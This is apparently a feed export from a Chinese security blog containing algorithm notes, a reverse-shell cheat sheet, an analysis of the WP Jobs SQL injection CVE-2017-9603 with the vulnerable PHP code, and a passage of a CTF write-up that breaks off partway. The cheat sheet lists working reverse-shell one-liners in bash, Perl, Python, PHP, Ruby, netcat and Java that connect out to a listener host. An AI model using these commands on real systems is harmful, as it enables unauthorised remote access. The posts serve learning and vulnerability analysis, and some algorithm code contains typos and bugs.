class="title">selectionSort</span><span class="params">(arr)</span>:</span></div><div class="line">  newArr = []</div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</div><div class="line">    smallest = findSmallest(arr)</div><div class="line">    newArr.append(arr.pop(smallest))</div><div class="line">  <span class="keyword">return</span> newArr</div></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">selectionSort</span><span class="params">(L)</span>:</span></div><div class="line">  N = len(L)</div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(N - <span class="number">1</span>):</div><div class="line">    min_index = i</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, N):</div><div class="line">      <span class="keyword">if</span> L[min_index] &gt; L[j]:</div><div class="line">        min_index = j</div><div class="line">    <span class="keyword">if</span> min_index != i:</div><div class="line">      L[min_index], L[i] = L[i], L[min_index]</div><div class="line">  <span class="keyword">return</span> L</div></pre></td></tr></table></figure><h3 id="0x03-Recursion"><a href="#0x03-Recursion" class="headerlink" title="0x03 Recursion"></a>0x03 Recursion</h3><p><strong>递归 = 基线条件 + 递归条件</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorial</span><span class="params">(x)</span>:</span></div><div class="line">  <span class="keyword">if</span> x == <span class="number">1</span>:</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span></div><div class="line">  <span class="keyword">else</span>:</div><div class="line">    <span class="keyword">return</span> x * factorial(x - <span class="number">1</span>)</div></pre></td></tr></table></figure><h3 id="0x04-quick-sort"><a href="#0x04-quick-sort" class="headerlink" title="0x04 quick sort"></a>0x04 quick sort</h3><p><strong>时间复杂度:</strong> O(n)=n*log n</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">quickSort</span><span class="params">(array)</span>:</span></div><div class="line">  <span class="keyword">if</span> len(array) &lt; <span class="number">2</span>:</div><div class="line">    <span class="keyword">return</span> array</div><div class="line">  <span class="keyword">else</span>:</div><div class="line">    pivot = array[<span class="number">0</span>]</div><div class="line">    less = [i <span class="keyword">for</span> i <span class="keyword">in</span> array[<span class="number">1</span>:] <span class="keyword">if</span> i &lt;= pivot]</div><div class="line">    greater = [i <span class="keyword">for</span> i <span class="keyword">in</span> array[<span class="number">1</span>:] <span class="keyword">if</span> i &gt; pivot]</div><div class="line">    <span class="keyword">return</span> quickSort(less) + [pivot] + quickSort(greater)</div></pre></td></tr></table></figure><h3 id="0x05-广度优先算法"><a href="#0x05-广度优先算法" class="headerlink" title="0x05 广度优先算法"></a>0x05 广度优先算法</h3><p><strong>运行时间:</strong> O(V+E)</p><p><strong>作用:</strong> </p><ol><li>寻找路径</li><li>寻找最短路径</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(name)</span>:</span></div><div class="line">  search_queue = deque()</div><div class="line">  search_queue += graph[name]</div><div class="line">  searched = []</div><div class="line">  <span class="keyword">while</span> search_queue:</div><div class="line">    person = search_queue.popleft()</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> person <span class="keyword">in</span> searched:</div><div class="line">      <span class="keyword">if</span> person_is_seller(person):</div><div class="line">        <span class="keyword">print</span> person + <span class="string">" is a mango seller!"</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">      <span class="keyword">else</span>:</div><div class="line">        search_queue + graph[person]</div><div class="line">        searched.append(person)</div><div class="line">  <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure><h3 id="0x06-Dijkstra’s-algorithm"><a href="#0x06-Dijkstra’s-algorithm" class="headerlink" title="0x06 Dijkstra’s algorithm"></a>0x06 Dijkstra’s algorithm</h3><p><strong>关键理念:</strong> 找出图中最便宜的节点，并确保没有到该节点的更便宜的路径。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">node = find_lowest_cost_node(costs)</div><div class="line"><span class="keyword">while</span> node <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">  cost = costs[node]</div><div class="line">  neighbors = graph[node]</div><div class="line">  <span class="keyword">for</span> n <span class="keyword">in</span> negighbors.keys():</div><div class="line">    new_cost = cost + neighbors[n]</div><div class="line">    <span class="keyword">if</span> costs[n] &gt; new_cost:</div><div class="line">      costs[n] = new_cost</div><div class="line">      parents[n] = node</div><div class="line">  processed.append(node)</div><div class="line">  node = find_lowest_sost_node(costs)</div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_lowest_cost_node</span><span class="params">(costs)</span>:</span></div><div class="line">  lowest_cost = float(<span class="string">"inf"</span>)</div><div class="line">  lowest_cost_node = <span class="keyword">None</span></div><div class="line">  <span class="keyword">for</span> node <span class="keyword">in</span> costs:</div><div class="line">    cost = costs[node]</div><div class="line">    <span class="keyword">if</span> cost &lt; lowest_cost <span class="keyword">and</span> node <span class="keyword">not</span> <span class="keyword">in</span> processed:</div><div class="line">      lowest_cost = cost</div><div class="line">      lowest_cost_node = node</div><div class="line">  <span class="keyword">return</span> lowest_cost_node</div></pre></td></tr></table></figure><h3 id="0x07-Greedy-algorithm"><a href="#0x07-Greedy-algorithm" class="headerlink" title="0x07 Greedy algorithm"></a>0x07 Greedy algorithm</h3><p><strong>选择局部最优解，最终得到的就是全局最优解</strong></p><h3 id="0x08-Dynamic-programming"><a href="#0x08-Dynamic-programming" class="headerlink" title="0x08 Dynamic programming"></a>0x08 Dynamic programming</h3><p><strong>先解决子问题，再逐步解决大问题</strong></p><h3 id="0x09-k-NearestNeighbor"><a href="#0x09-k-NearestNeighbor" class="headerlink" title="0x09 k-NearestNeighbor"></a>0x09 k-NearestNeighbor</h3><p><strong>分类</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;今天看了一个简单的问题，去通信录上查电话号码。如何完成的，直接回答了二分法，然后自己想了想，既然我脑
      
    
    </summary>
    
    
      <category term="programme" scheme="https://bypupil.github.io/tags/programme/"/>
    
  </entry>
  
  <entry>
    <title>不会这几条命令，如何内网搅屎</title>
    <link href="https://bypupil.github.io/2017/09/23/%E4%B8%8D%E4%BC%9A%E8%BF%99%E5%87%A0%E6%9D%A1%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%A6%82%E4%BD%95%E5%86%85%E7%BD%91%E6%90%85%E5%B1%8E/"/>
    <id>https://bypupil.github.io/2017/09/23/不会这几条命令，如何内网搅屎/</id>
    <published>2017-09-23T08:25:59.000Z</published>
    <updated>2017-09-23T15:43:56.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>昨天晚上11点的时候，学长跟我说<code>Python</code>的官网的在线<code>shell</code>存在命令执行。有命令执行的情况下，很大程度下意味着，我们可以增加账号或者SSH KEY。在<code>Python</code>官网下确实通过命令执行能够将内网的shell反弹出来。由于个人太愚钝，弄到凌晨两点才给弄出来。</p><p>这篇文章当然不是来讲<code>Python</code>网站这个问题，这个特意留下或者确实存在的问题。主要聊一聊网上这堆教程已经满地是的<code>Linux下反弹shell的方法</code>。</p><h2 id="0x01-测试环境"><a href="#0x01-测试环境" class="headerlink" title="0x01 测试环境"></a>0x01 测试环境</h2><p>愚人废话在多说一点，毕竟要反弹shell，所以远程主机上一定要有一些工具或者脚本才能完成这个流程。如果没有这些工具或者脚本，在一些可能的情况下，依然可以将其上传到远程主机上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Kali 2.0 — 2017/2</div><div class="line">Debian 7.0x64</div></pre></td></tr></table></figure><h2 id="0x02-常用的工具及脚本"><a href="#0x02-常用的工具及脚本" class="headerlink" title="0x02 常用的工具及脚本"></a>0x02 常用的工具及脚本</h2><p>控制端主机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -l -p 1234 -vvv</div></pre></td></tr></table></figure><p><strong>Bash</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/&lt;Target_IP&gt;/&lt;Port&gt; 0&gt;&amp;1</div></pre></td></tr></table></figure><p><strong>Perl</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">perl -e <span class="string">'use </span></div><div class="line"><span class="string">Socket;$i="&lt;Target_IP&gt;";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))</span></div><div class="line"><span class="string">&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></div></pre></td></tr></table></figure><p><strong>Python</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;Target_IP&gt;",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></div></pre></td></tr></table></figure><p><strong>PHP</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("&lt;Target_IP&gt;",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure><p><strong>Ruby</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("&lt;Target_IP&gt;",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></div></pre></td></tr></table></figure><p>Ruby这个测试了多次一直没有成功。</p><p><strong>NetCat</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh &lt;Target_IP&gt; 1234</div></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;Target_IP&gt; 1234 &gt;/tmp/f</div></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc &lt;Target_IP&gt; 8888|/bin/sh|nc &lt;Target_IP&gt; 9999</div></pre></td></tr></table></figure><p><strong>Java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/192.168.8.31/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</div><div class="line">p.waitFor()</div></pre></td></tr></table></figure><p>java版本的，我也没测试成功。本人太愚。</p><h6 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h6><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="external">Reverse Shell Cheat Sheet</a><br><a href="https://www.waitalone.cn/linux-shell-rebound-under-way.html" target="_blank" rel="external">Linux下反弹shell方法</a><br><a href="http://www.linuxidc.com/Linux/2016-11/136993.htm" target="_blank" rel="external">Linux里的2&gt;&amp;1究竟是什么</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;昨天晚上11点的时候，学长跟我说&lt;code&gt;Python&lt;/code&gt;的官网的在线&lt;code&gt;she
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://bypupil.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-9603 分析</title>
    <link href="https://bypupil.github.io/2017/09/18/CVE-2017-9603-%E5%88%86%E6%9E%90/"/>
    <id>https://bypupil.github.io/2017/09/18/CVE-2017-9603-分析/</id>
    <published>2017-09-18T05:11:07.000Z</published>
    <updated>2017-09-24T09:26:37.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>突然有一种冲动想挖个CVE，然后在CVE官网上找到了一个<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9603" target="_blank" rel="external">CVE-2017-9603</a>，开始分析了一波，然后在找些无人区弄个CVE。┑(￣▽ ￣)┍</p><h3 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h3><ol><li>phpstudy</li><li>wordpress/4.8.1/zh-CN</li><li>WP jobs 1.4~1.5</li></ol><h3 id="0x02-描述"><a href="#0x02-描述" class="headerlink" title="0x02 描述"></a>0x02 描述</h3><p>wordpress 中WP Jobs插件版本低于1.5存在经过验证的用户可以通过<code>wp-admin/edit.php</code>页面中的<code>jobid</code>参数执行任意的SQL命令。</p><h3 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h3><p>漏洞的发生位置在<code>wp-jobs\wpjobs_applications.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$job_id = $_REQUEST[<span class="string">'jobid'</span>];  <span class="comment">#在未过滤的情况下获取参数jobid</span></div><div class="line">$jb_args = <span class="keyword">array</span>(</div><div class="line">    <span class="string">'posts_per_page'</span> =&gt; <span class="number">-1</span>,</div><div class="line">    <span class="string">'orderby'</span> =&gt; <span class="string">'post_date'</span>,</div><div class="line">    <span class="string">'order'</span> =&gt; <span class="string">'DESC'</span>,</div><div class="line">    <span class="string">'post_type'</span> =&gt; <span class="string">'job'</span>,</div><div class="line">    <span class="string">'post_status'</span> =&gt; <span class="string">'publish'</span>,</div><div class="line">    <span class="string">'suppress_filters'</span> =&gt; <span class="keyword">true</span>);</div><div class="line"></div><div class="line">$jobs = get_posts($jb_args);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;form autocomplete=<span class="string">"off"</span> name=<span class="string">"form"</span> id=<span class="string">"form"</span>&gt;</div><div class="line">    <span class="meta">&lt;?php</span> _e(<span class="string">'Filter by Job'</span>, <span class="string">'wp-jobs'</span>); <span class="meta">?&gt;</span> &lt;select name=<span class="string">"jumpMenu"</span> id=<span class="string">"jumpMenu"</span> onchange=<span class="string">"MM_jumpMenu('parent', this, 0)"</span>&gt;</div><div class="line">        &lt;option value=<span class="string">"edit.php?post_type=job&amp;page=WPJobsJobApps"</span>&gt;All Applications&lt;/option&gt;</div><div class="line">        <span class="meta">&lt;?php</span> <span class="keyword">foreach</span> ($jobs <span class="keyword">as</span> $job_info) : setup_postdata($jobs); <span class="meta">?&gt;</span></div><div class="line">            &lt;option <span class="meta">&lt;?php</span></div><div class="line">            <span class="keyword">if</span> ($job_info-&gt;ID == $job_id) &#123;</div><div class="line">                <span class="keyword">echo</span> <span class="string">'selected="selected"'</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="meta">?&gt;</span> value=<span class="string">"edit.php?post_type=job&amp;page=WPJobsJobApps&amp;jobid=&lt;?php echo $job_info-&gt;ID; ?&gt;"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $job_info-&gt;post_title; <span class="meta">?&gt;</span>&lt;/option&gt;</div><div class="line">                <span class="meta">&lt;?php</span></div><div class="line">            <span class="keyword">endforeach</span>;</div><div class="line">            wp_reset_postdata();</div><div class="line">            <span class="meta">?&gt;</span></div><div class="line">    &lt;/select&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;style&gt;</div><div class="line">    .dctrprt tr th, .dctrprt tr td &#123;</div><div class="line">        font-family:Arial, Helvetica, sans-serif;</div><div class="line">        font-size:<span class="number">13</span>px;</div><div class="line">    &#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;table class="widefat dctrprt"&gt;</div><div class="line">    &lt;tr&gt;</div><div class="line">        &lt;th&gt;&lt;strong&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'S.No'</span>, <span class="string">'wp-jobs'</span>); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;/th&gt;</div><div class="line">        &lt;th&gt;&lt;strong&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Job Title'</span>, <span class="string">'wp-jobs'</span>); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;/th&gt;</div><div class="line">        &lt;th&gt;&lt;strong&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Full Name'</span>, <span class="string">'wp-jobs'</span>); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;/th&gt;</div><div class="line">        &lt;th&gt;&lt;strong&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Email'</span>, <span class="string">'wp-jobs'</span>); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;/th&gt;</div><div class="line">        &lt;th&gt;&lt;strong&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Phone Number'</span>, <span class="string">'wp-jobs'</span>); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;/th&gt;</div><div class="line">        &lt;th&gt;&lt;strong&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Download Resume'</span>, <span class="string">'wp-jobs'</span>); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;/th&gt;</div><div class="line">    &lt;/tr&gt;</div><div class="line">    <span class="meta">&lt;?php</span></div><div class="line">    $tbl = $wpdb-&gt;prefix;</div><div class="line">    $qry = <span class="string">"Select * from "</span> . $tbl . <span class="string">"app_user_info "</span>;</div><div class="line">    <span class="keyword">if</span> ($job_id &lt;&gt; <span class="string">""</span>) &#123;</div><div class="line">        $qry .= <span class="string">" where app_job_id = "</span> . $job_id;   <span class="comment">##$job_id参数拼接SQL语句</span></div><div class="line">    &#125;</div><div class="line">    $qry .= <span class="string">" Order by `app_id` Desc "</span>;</div><div class="line">    $users = $wpdb-&gt;get_results($qry);</div><div class="line">    $i = <span class="number">1</span>;</div><div class="line">    <span class="keyword">foreach</span> ($users <span class="keyword">as</span> $user) &#123;</div><div class="line">        <span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>代码第十行，获取了没有过滤的的<code>$_REQUEST[&#39;jobid&#39;]</code>的变量，然后在代码56行进行了<code>SQL语句</code>拼接。且拼接的唯一要求就是<code>$job_id &lt;&gt; &quot;&quot;</code>。只要$job_id有值就可以完成拼接。</p><h3 id="0x04-验证想法"><a href="#0x04-验证想法" class="headerlink" title="0x04 验证想法"></a>0x04 验证想法</h3><p><strong>测试如下：</strong></p><img src="/2017/09/18/CVE-2017-9603-分析/1.png" alt="ByPupil" title="ByPupil"><h3 id="0x05-修复方案"><a href="#0x05-修复方案" class="headerlink" title="0x05 修复方案"></a>0x05 修复方案</h3><p>修复的常见套路就是将<code>WP Jobs</code>更新到最新的可用版本即可。</p><p>我们详细查看下，官方是如何修复此次的漏洞的。然后下载了<code>WP Jobs 1.5</code>。</p><p>在1.5版本中使用了<code>sanitize_key</code>函数对参数进行过滤，使<code>jobid</code>参数只允许包含数字，字母，破折号和下划线。<code>jobid</code>参数不在使用拼接的方式，而是使用参数化。</p><img src="/2017/09/18/CVE-2017-9603-分析/2.png" alt="ByPupil" title="ByPupil"><img src="/2017/09/18/CVE-2017-9603-分析/3.png" alt="Bypupil" title="Bypupil"><h3 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h3><p>个人觉得这个漏洞很鸡肋，必须要登录到后台才能够进行SQL注入。只要花时间，CVE其实并没有想象中那么难拿。┑(￣▽ ￣)┍</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;突然有一种冲动想挖个CVE，然后在CVE官网上找到了一个&lt;a href=&quot;https://cve.m
      
    
    </summary>
    
    
      <category term="code audit" scheme="https://bypupil.github.io/tags/code-audit/"/>
    
  </entry>
  
  <entry>
    <title>南邮CTF综合题2WriteUp</title>
    <link href="https://bypupil.github.io/2017/09/11/%E5%8D%97%E9%82%AECTF%E7%BB%BC%E5%90%88%E9%A2%982WriteUp/"/>
    <id>https://bypupil.github.io/2017/09/11/南邮CTF综合题2WriteUp/</id>
    <published>2017-09-10T16:10:00.000Z</published>
    <updated>2017-09-13T15:56:33.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>由于这道题目能够读取源码，很开的我将它收入到了我的<a href="https://github.com/ByPupil/ctfhub" target="_blank" rel="external">CTFHub</a>中。<a href="https://github.com/ByPupil/ctfhub" target="_blank" rel="external">CTFHub</a>这个项目是我前几天突然的冲动就让他诞生了。简单介绍下，<a href="https://github.com/ByPupil/ctfhub" target="_blank" rel="external">CTFHub</a>是面向所有学习CTF的朋友的环境，不用了解docker原理及知识，仅仅简单执行几条命令即可完成整个平台的搭建。方便大家去做一些已经没有在线环境的挑战题。当然，师傅们有什么好的题目也可以通过该项目中的邮箱联系我。在这儿谢谢将来未这个项目共同努力的朋友们。</p><h3 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h3><p>首先，访问了主页，这是一个留言板的项目。根据题目描述这是一道非xss的题目。所以直接放弃怼xss。</p><img src="/2017/09/11/南邮CTF综合题2WriteUp/1.png" alt="Bypupil" title="Bypupil"><p>通过首页的信息，我们获取到该文章存在的如下页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">/index.php</div><div class="line">/preview.php</div><div class="line">/about.php</div><div class="line">/say.php</div><div class="line">/so.php</div></pre></td></tr></table></figure><p>在页面的最下放有一个<strong>本CMS说明</strong>，通过该文件和之前的信息，我们可以知道该系统存在如下文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">config.php：存放数据库信息</div><div class="line">index.php：主页文件</div><div class="line">passencode.php：Funny公司自写密码加密算法库</div><div class="line">say.php：用于接收和处理用户留言请求</div><div class="line">sm.txt：本CMS的说明文档</div><div class="line">preview.php：留言提交的接口</div><div class="line">about.php：文件读取的接口</div><div class="line">so.php：留言查询的接口</div></pre></td></tr></table></figure><p>且了解到数据库中存在<code>admin</code>数据表。</p><p>通过观察<strong>本CMS说明</strong>的链接<code>http://cms.nuptzj.cn/about.php?file=sm.txt</code>是一个文件读取链接。通过尝试，在已知的链接中除<code>config.php</code>的文件内容不能获取，其他文件都可以获取到源代码。</p><p>为了节省篇幅<code>index.php</code>源码就不粘贴了，因为没有可利用的地方。</p><p><code>passencode.php</code>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">passencode</span><span class="params">($content)</span> </span>&#123;</div><div class="line">    <span class="comment">//$pass=urlencode($content);</span></div><div class="line">    $array = str_split($content);</div><div class="line">    $pass = <span class="string">""</span>;</div><div class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; count($array);$i++) &#123;</div><div class="line">        <span class="keyword">if</span> ($pass != <span class="string">""</span>) &#123;</div><div class="line">            $pass = $pass . <span class="string">" "</span> . (string)ord($array[$i]);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $pass = (string)ord($array[$i]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $pass;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>加密部分就是将密码的ASCII码保存了。</p><p><code>about.php</code>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$file = $_GET[<span class="string">'file'</span>];</div><div class="line"><span class="keyword">if</span> ($file == <span class="string">""</span> || strstr($file, <span class="string">'config.php'</span>)) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"file参数不能为空！"</span>;</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $cut = strchr($file, <span class="string">"loginxlcteam"</span>);</div><div class="line">    <span class="keyword">if</span> ($cut == <span class="keyword">false</span>) &#123;</div><div class="line">        $data = file_get_contents($file);</div><div class="line">        $date = htmlspecialchars($data);</div><div class="line">        <span class="keyword">echo</span> $date;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('敏感目录，禁止查看！但是。。。')&lt;/script&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>通过<code>about.php</code>可以知道另一个敏感敏感目录<code>loginxlcteam</code>。</p><p>访问后发现是一个登录页面，爆破了下若密码和万能密码都没有成功。</p><img src="/2017/09/11/南邮CTF综合题2WriteUp/2.png" alt="ByPupil" title="ByPupil"><h3 id="0x02-漏洞发现"><a href="#0x02-漏洞发现" class="headerlink" title="0x02 漏洞发现"></a>0x02 漏洞发现</h3><p><code>so.php</code>源码如下：</p><figure class="highlight 